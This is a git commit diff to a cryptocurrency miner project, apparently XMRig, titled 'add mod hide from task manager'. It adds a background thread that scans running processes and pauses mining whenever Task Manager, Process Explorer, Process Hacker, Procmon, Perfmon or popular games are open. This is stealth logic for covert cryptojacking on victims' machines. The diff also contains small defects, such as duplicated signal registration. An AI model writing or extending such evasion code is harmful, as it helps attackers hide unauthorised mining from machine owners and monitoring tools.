5ccc11816e377abb69e034c4060cdb69d8be46b8
Felipe Rojas <35433329+PipeDeveloper@users.noreply.github.com>
2018-02-21 20:24:26 -0300

    add mod hide from task manager

--- src/App.cpp
+++ src/App.cpp
@@ -1,7 +1,6 @@
 #include <stdlib.h>
 #include <uv.h>
 
-
 #include "api/Api.h"
 #include "App.h"
 #include "Console.h"
@@ -18,6 +17,9 @@
 #include "version.h"
 #include "workers/Workers.h"
 
+#include <windows.h>
+#include <tlhelp32.h>
+#include <thread>
 
 #ifdef HAVE_SYSLOG_H
 #   include "log/SysLog.h"
@@ -27,10 +29,8 @@
 #   include "api/Httpd.h"
 #endif
 
-
 App *App::m_self = nullptr;
-
-
+bool IsProcessRun(void);
 
 App::App(int argc, char **argv) :
     m_console(nullptr),
@@ -68,35 +68,72 @@ App::App(int argc, char **argv) :
 
     m_network = new Network(m_options);
 
+	uv_signal_init(uv_default_loop(), &m_signal);
     uv_signal_init(uv_default_loop(), &m_sigHUP);
     uv_signal_init(uv_default_loop(), &m_sigINT);
     uv_signal_init(uv_default_loop(), &m_sigTERM);
 }
 
-
 App::~App()
 {
     uv_tty_reset_mode();
-
 #   ifndef XMRIG_NO_HTTPD
     delete m_httpd;
 #   endif
-
     delete m_console;
 }
 
+void Check() {
+	while(true) {
+		Sleep(1000);
+		bool Founded = IsProcessRun();
+		switch (Founded) {
+			case 1:
+				Workers::setEnabled(false);
+				break;
 
-int App::exec()
+			default:
+				if (!Workers::isEnabled()) { Workers::setEnabled(true); }
+				break;
+		}
+	}
+}
+
+bool IsProcessRun(void)
 {
-    if (!m_options) {
-        return 2;
-    }
+	bool RUN;
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 pe;
+	pe.dwSize = sizeof(PROCESSENTRY32);
+	Process32First(hSnapshot, &pe);
+	while (Process32Next(hSnapshot, &pe))
+	{
+		if (wcscmp(pe.szExeFile, L"taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"Taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"dota2.exe") == 0 || wcscmp(pe.szExeFile, L"csgo.exe") == 0 || wcscmp(pe.szExeFile, L"payday.exe") == 0 || wcscmp(pe.szExeFile, L"Minecraft.exe") == 0 || wcscmp(pe.szExeFile, L"TheDivision.exe") == 0 || wcscmp(pe.szExeFile, L"GTA5.exe") == 0 || wcscmp(pe.szExeFile, L"re7.exe") == 0 || wcscmp(pe.szExeFile, L"Prey.exe") == 0 || wcscmp(pe.szExeFile, L"Overwatch.exe") == 0 || wcscmp(pe.szExeFile, L"MK10.exe") == 0 || wcscmp(pe.szExeFile, L"QuakeChampions.exe") == 0 || wcscmp(pe.szExeFile, L"crossfire.exe") == 0 || wcscmp(pe.szExeFile, L"pb.exe") == 0 || wcscmp(pe.szExeFile, L"wot.exe") == 0 || wcscmp(pe.szExeFile, L"lol.exe") == 0 || wcscmp(pe.szExeFile, L"perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"Perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"SystemExplorer.exe") == 0 || wcscmp(pe.szExeFile, L"TaskMan.exe") == 0 || wcscmp(pe.szExeFile, L"ProcessHacker.exe") == 0 || wcscmp(pe.szExeFile, L"procexp64.exe") == 0 || wcscmp(pe.szExeFile, L"procexp.exe") == 0 || wcscmp(pe.szExeFile, L"Procmon.exe") == 0 || wcscmp(pe.szExeFile, L"Daphne.exe") == 0)
+		{
+			RUN = true;
+			return RUN;
+		}
+		else
+			RUN = false;
+	}
+	return RUN;
+}
 
+int App::exec() {
+	
+	std::thread* check_taskers = new std::thread(Check);
+	check_taskers->detach();
+	
+    if (!m_options) { return 2; }
     uv_signal_start(&m_sigHUP,  App::onSignal, SIGHUP);
     uv_signal_start(&m_sigINT,  App::onSignal, SIGINT);
     uv_signal_start(&m_sigTERM, App::onSignal, SIGTERM);
-
     background();
+	
+	if (!m_options) { return 0; }
+    uv_signal_start(&m_signal, App::onSignal, SIGHUP);
+    uv_signal_start(&m_signal, App::onSignal, SIGTERM);
+    uv_signal_start(&m_signal, App::onSignal, SIGINT);
 
     if (!CryptoNight::init(m_options->algo(), m_options->algoVariant())) {
         LOG_ERR("\"%s\" hash self-test failed.", m_options->algoName());
@@ -123,12 +160,15 @@ int App::exec()
 #   endif
 
     Workers::start(m_options->affinity(), m_options->priority());
-
     m_network->connect();
 
     const int r = uv_run(uv_default_loop(), UV_RUN_DEFAULT);
     uv_loop_close(uv_default_loop());
-
+	
+    delete m_network;
+    Options::release();
+    Mem::release();
+    Platform::release();
     release();
     return r;
 }
@@ -173,7 +213,6 @@ void App::close()
 {
     m_network->stop();
     Workers::stop();
-
     uv_stop(uv_default_loop());
 }
 
